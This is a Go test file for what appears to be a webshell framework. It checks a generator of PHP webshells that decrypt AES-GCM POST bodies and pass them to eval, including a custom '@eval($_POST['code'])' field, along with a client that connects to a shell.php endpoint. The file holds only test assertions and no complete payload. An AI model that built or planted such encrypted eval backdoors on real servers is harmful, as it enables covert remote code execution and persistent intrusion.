package php

import (
	"context"
	"encoding/hex"
	"strings"
	"testing"

	"github.com/Yliken/redbeanshellcore/core"
)

var cryptoShellTestKey = []byte("0123456789abcdef0123456789abcdef")

func TestCryptoShellSourceGolden(t *testing.T) {
	src := CryptoShellSource(cryptoShellTestKey)
	for _, want := range []string{
		"openssl_decrypt",
		"openssl_encrypt",
		"OPENSSL_RAW_DATA",
		"aes-256-gcm",
		"parse_str",
		"array_merge",
		DefaultCryptoField,
		"eval",
	} {
		if !strings.Contains(src, want) {
			t.Fatalf("shell 缺少 %q:\n%s", want, src)
		}
	}
	if strings.Contains(src, ", 2,") || strings.Contains(src, "OPENSSL_ZERO_PADDING") {
		t.Fatalf("shell 不应使用 openssl options 2:\n%s", src)
	}
	if strings.Contains(src, "RBS1.0") || strings.Contains(src, "tag_s") || strings.Contains(src, "tag_e") {
		t.Fatalf("eval 型加密 shell 不应携带 marker envelope:\n%s", src)
	}
}

func TestCryptoShellSourceCustomFields(t *testing.T) {
	opts := DefaultCryptoShellOptions()
	opts.CryptoField = "cipher"
	opts.EvalField = "code"
	src := CryptoShellSourceWith(cryptoShellTestKey, opts)
	if !strings.Contains(src, "$_POST['cipher']") {
		t.Fatalf("自定义加密字段未生效:\n%s", src)
	}
	if !strings.Contains(src, "@eval($_POST['code'])") {
		t.Fatalf("自定义 eval 字段未生效:\n%s", src)
	}
}

func TestCryptoShellMeta(t *testing.T) {
	mode, fp := CryptoShellMeta(cryptoShellTestKey)
	if mode != "aes-gcm" {
		t.Fatalf("mode 应为 aes-gcm，got %q", mode)
	}
	mode2, fp2 := CryptoShellMeta(cryptoShellTestKey)
	if mode2 != mode || fp2 != fp {
		t.Fatalf("fingerprint 应稳定: %q != %q", fp2, fp)
	}
	if len(fp) != 16 {
		t.Fatalf("fingerprint 应为 16 个 hex 字符，got %q", fp)
	}
}

func TestNewClient_BodyCrypto(t *testing.T) {
	keyHex := hex.EncodeToString(cryptoShellTestKey)
	_, fp := CryptoShellMeta(cryptoShellTestKey)
	rec := &core.NodeRecord{
		Config: core.NodeConfig{
			ID:        "n1",
			Endpoint:  "http://example.com/shell.php",
			Adapter:   "php",
			Transport: "httpform",
			Options: map[string]string{
				"crypto_key_hex":        keyHex,
				"crypto_mode":           "aes-gcm",
				"shell_key_fingerprint": fp,
			},
		},
	}
	client, err := NewClientFactory().NewClient(context.Background(), rec)
	if err != nil {
		t.Fatalf("NewClient: %v", err)
	}
	if client == nil {
		t.Fatal("client 不应为 nil")
	}
	if client.Session().Adapter != "php-eval" {
		t.Fatalf("body crypto 应使用 php-eval profile，got %q", client.Session().Adapter)
	}
	if client.Session().Metadata["crypto_mode"] != "aes-gcm" {
		t.Fatalf("crypto_mode 应注入 session metadata，got %q", client.Session().Metadata["crypto_mode"])
	}
}

func TestNewClient_BodyCryptoValidation(t *testing.T) {
	keyHex := hex.EncodeToString(cryptoShellTestKey)
	base := func() *core.NodeRecord {
		return &core.NodeRecord{
			Config: core.NodeConfig{
				ID:        "n1",
				Endpoint:  "http://example.com/shell.php",
				Adapter:   "php",
				Transport: "httpform",
				Options: map[string]string{
					"crypto_key_hex": keyHex,
				},
			},
		}
	}

	rec := base()
	rec.Config.Options["crypto_mode"] = "xor"
	if _, err := NewClientFactory().NewClient(context.Background(), rec); err == nil || !strings.Contains(err.Error(), "crypto mode") {
		t.Fatalf("crypto mode 不匹配应报错，got %v", err)
	}

	rec = base()
	rec.Config.Options["shell_key_fingerprint"] = "0000000000000000"
	if _, err := NewClientFactory().NewClient(context.Background(), rec); err == nil || !strings.Contains(err.Error(), "指纹") {
		t.Fatalf("key 指纹不匹配应报错，got %v", err)
	}

	rec = base()
	rec.Config.Options["crypto_key_hex"] = "zz"
	if _, err := NewClientFactory().NewClient(context.Background(), rec); err == nil {
		t.Fatal("非法 hex key 应报错")
	}
}
